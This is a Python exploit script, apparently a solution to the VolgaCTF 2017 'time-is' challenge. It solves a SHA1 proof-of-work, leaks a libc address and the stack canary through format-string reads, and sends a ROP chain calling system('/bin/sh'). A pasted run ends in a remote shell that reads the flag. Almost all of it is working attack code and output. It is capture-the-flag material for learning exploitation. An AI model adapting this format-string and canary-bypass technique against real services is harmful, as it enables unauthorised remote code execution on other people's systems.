from pwn import *
from itertools import product, permutations
import hashlib
import re
import time

x = "0123456789abcdefghijklmnopqrstuvwxyz"
p = product(x, repeat=5)

s = remote("time-is.quals.2017.volgactf.ru", 45678)
print s.recvuntil("x[:24]=='")
num = s.recvuntil("'")[:-1]
print num
final = ""
for n in p:
    f =str("".join(n))
    final = num + f
    number = hashlib.sha1(final).hexdigest()
    if (int(number, 16) & 0x3FFFFFF) == 0x3FFFFFF:
        print "[+] Plain text found %s" % final 
        break
s.sendline(final)

#s = process('./time_is')
s.recvline()
s.recvline()
s.sendline('%llx.'*6)

leak  = s.recvline()
m = re.search('\.(7[0-9a-f]+)\.\:', leak)

libc = int(m.group(1), 16) - 0x3C84A0
system = libc + 0x45390
binsh = libc + 0x18c177
print "[+] libc @ 0x%x" % libc
print "[+] system @ 0x%x" % system
print "[+] '/bin/sh' @ 0x%x" % binsh

s.recvline()
s.sendline('%llx.'*268)
leak = s.recvline()
m = re.search('\.([0-9a-f]+)\.\:', leak)
cookie = int(m.group(1), 16)
print "[+] cookie: 0x%x" % cookie

pop_edi = 0x400B34

payload = 'A'*0x808
payload += p64(cookie)
payload += 'B'*0x38
payload += p64(pop_edi)
payload += p64(binsh)
payload += p64(system)

s.sendline(payload)
s.sendline('q')

s.recvline()
s.recvline()
s.interactive()


'''
$ python time_local.py 
[+] Opening connection to time-is.quals.2017.volgactf.ru on port 45678: Done
Solve a puzzle: find an x such that 26 last bits of SHA1(x) are set, len(x)==29 and x[:24]=='
ed6f7c92ad91d92e79fc9258
[+] Plain text found ed6f7c92ad91d92e79fc9258n1heb
[+] libc @ 0x7f8955a28000
[+] system @ 0x7f8955a6d390
[+] '/bin/sh' @ 0x7f8955bb4177
[+] cookie: 0xd5aeb1bcab69d00
[*] Switching to interactive mode
See you!
$ pwd
/opt/time-is
$ ls
flag.txt
time_is
$ cat flag.txt
VolgaCTF{D0nt_u$e_printf_dont_use_C_dont_pr0gr@m}$ 
'''

